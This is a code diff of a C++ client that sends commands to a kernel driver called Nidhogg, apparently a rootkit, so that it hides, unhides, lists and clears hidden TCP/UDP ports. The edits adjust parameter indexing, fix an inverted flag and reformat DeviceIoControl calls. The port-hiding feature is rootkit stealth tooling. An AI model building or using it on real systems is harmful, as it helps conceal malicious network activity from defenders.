@@ -21,9 +21,9 @@ void NetworkHandler::HandleCommand(_In_ std::string command) {
 			PrintHelp();
 			return;
 		}
-		USHORT portNumber = static_cast<USHORT>(atoi(params.at(1).c_str()));
-		PortType portType = (params.at(2) == "tcp") ? PortType::TCP : PortType::UDP;
-		bool remote = params.at(3) == "remote";
+		USHORT portNumber = static_cast<USHORT>(atoi(params.at(0).c_str()));
+		PortType portType = (params.at(1) == "tcp") ? PortType::TCP : PortType::UDP;
+		bool remote = params.at(2) == "remote";
 		Hide(portNumber, portType, remote, true) ? std::cout << "Port " << portNumber << " hidden" << std::endl :
 			std::cerr << "Failed to hide port " << portNumber << std::endl;
 	}
@@ -32,14 +32,14 @@ void NetworkHandler::HandleCommand(_In_ std::string command) {
 			PrintHelp();
 			return;
 		}
-		USHORT portNumber = static_cast<USHORT>(atoi(params.at(1).c_str()));
-		PortType portType = (params.at(2) == "tcp") ? PortType::TCP : PortType::UDP;
-		bool remote = params.at(3) == "remote";
-		Hide(portNumber, portType, !remote, false) ? std::cout << "Port " << portNumber << " unhidden" << std::endl :
+		USHORT portNumber = static_cast<USHORT>(atoi(params.at(0).c_str()));
+		PortType portType = (params.at(1) == "tcp") ? PortType::TCP : PortType::UDP;
+		bool remote = params.at(2) == "remote";
+		Hide(portNumber, portType, remote, false) ? std::cout << "Port " << portNumber << " unhidden" << std::endl :
 			std::cerr << "Failed to unhide port " << portNumber << std::endl;
 	}
 	else if (commandName.compare("list") == 0) {
-		if (params.size() != 2) {
+		if (params.size() != 1) {
 			std::cerr << "Invalid usage" << std::endl;
 			PrintHelp();
 			return;
@@ -97,7 +97,7 @@ void NetworkHandler::HandleCommand(_In_ std::string command) {
 		}
 	}
 	else if (commandName.compare("clear") == 0) {
-		if (params.size() != 2) {
+		if (params.size() != 1) {
 			std::cerr << "Invalid usage" << std::endl;
 			PrintHelp();
 			return;
@@ -151,26 +151,26 @@ void NetworkHandler::HandleCommand(_In_ std::string command) {
 * @bool					-- Whether the input parameters are valid or not.
 */
 bool NetworkHandler::CheckInput(_In_ const std::vector<std::string>& params) {
-	if (params.size() != 4) {
+	if (params.size() != 3) {
 		std::cerr << "Invalid usage" << std::endl;
 		PrintHelp();
 		return false;
 	}
-	if (params.at(1).empty() || !std::all_of(params.at(1).begin(), params.at(1).end(), ::isdigit)) {
+	if (params.at(0).empty() || !std::all_of(params.at(0).begin(), params.at(0).end(), ::isdigit)) {
 		std::cerr << "Invalid port number" << std::endl;
 		return false;
 	}
-	USHORT portNumber = static_cast<USHORT>(atoi(params.at(1).c_str()));
+	USHORT portNumber = static_cast<USHORT>(atoi(params.at(0).c_str()));
 
 	if (portNumber == 0 || portNumber > 65535) {
 		std::cerr << "Port number must be between 1 and 65535" << std::endl;
 		return false;
 	}
-	if (params.at(2) != "tcp" && params.at(2) != "udp") {
+	if (params.at(1) != "tcp" && params.at(1) != "udp") {
 		std::cerr << "Invalid port type. Use 'tcp' or 'udp'." << std::endl;
 		return false;
 	}
-	if (params.at(3) != "remote" && params.at(3) != "local") {
+	if (params.at(2) != "remote" && params.at(2) != "local") {
 		std::cerr << "Invalid remote/local option. Use 'remote' or 'local'." << std::endl;
 		return false;
 	}
@@ -198,8 +198,14 @@ bool NetworkHandler::Hide(_In_ USHORT portNumber, _In_ PortType portType, _In_ b
 	hiddenPort.Remote = remote;
 	hiddenPort.Type = portType;
 
-	return DeviceIoControl(this->hNidhogg.get(), IOCTL_HIDE_UNHIDE_PORT, &hiddenPort, sizeof(hiddenPort), nullptr, 0, 
-		&returned, nullptr);
+	return DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_HIDE_UNHIDE_PORT, 
+		&hiddenPort, 
+		sizeof(hiddenPort), 
+		nullptr, 
+		0, 
+		&returned, 
+		nullptr);
 }
 
 /*
@@ -219,8 +225,14 @@ std::vector<IoctlHiddenPortEntry> NetworkHandler::ListHiddenPorts(_In_ PortType 
 	std::vector<IoctlHiddenPortEntry> hiddenPorts;
 	rawHiddenPorts.Type = type;
 
-	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_LIST_HIDDEN_PORTS, &rawHiddenPorts, sizeof(rawHiddenPorts), 
-		&rawHiddenPorts, sizeof(rawHiddenPorts), &returned, nullptr)) {
+	if (!DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_LIST_HIDDEN_PORTS, 
+		&rawHiddenPorts, 
+		sizeof(rawHiddenPorts), 
+		&rawHiddenPorts, 
+		sizeof(rawHiddenPorts), 
+		&returned, 
+		nullptr)) {
 		throw NetworkHandlerException("Failed to list hidden ports.");
 	}
 
@@ -231,8 +243,14 @@ std::vector<IoctlHiddenPortEntry> NetworkHandler::ListHiddenPorts(_In_ PortType 
 		catch (SafeMemoryException&) {
 			throw NetworkHandlerException("Failed to allocate memory for hidden ports list");
 		}
-		if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_LIST_HIDDEN_PORTS, &rawHiddenPorts, sizeof(rawHiddenPorts),
-			&rawHiddenPorts, sizeof(rawHiddenPorts), &returned, nullptr)) {
+		if (!DeviceIoControl(*hNidhogg.get(), 
+			IOCTL_LIST_HIDDEN_PORTS, 
+			&rawHiddenPorts, 
+			sizeof(rawHiddenPorts),
+			&rawHiddenPorts, 
+			sizeof(rawHiddenPorts), 
+			&returned, 
+			nullptr)) {
 			SafeFree(rawHiddenPorts.Ports);
 			throw NetworkHandlerException("Failed to list hidden ports.");
 		}
@@ -258,6 +276,12 @@ std::vector<IoctlHiddenPortEntry> NetworkHandler::ListHiddenPorts(_In_ PortType 
 */
 bool NetworkHandler::ClearHiddenPorts(_In_ PortType type) {
 	DWORD returned;
-	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_HIDDEN_PORTS,
-		&type, sizeof(type), nullptr, 0, &returned, nullptr);
+	return DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_CLEAR_HIDDEN_PORTS,
+		&type, 
+		sizeof(type), 
+		nullptr, 
+		0, 
+		&returned, 
+		nullptr);
 }
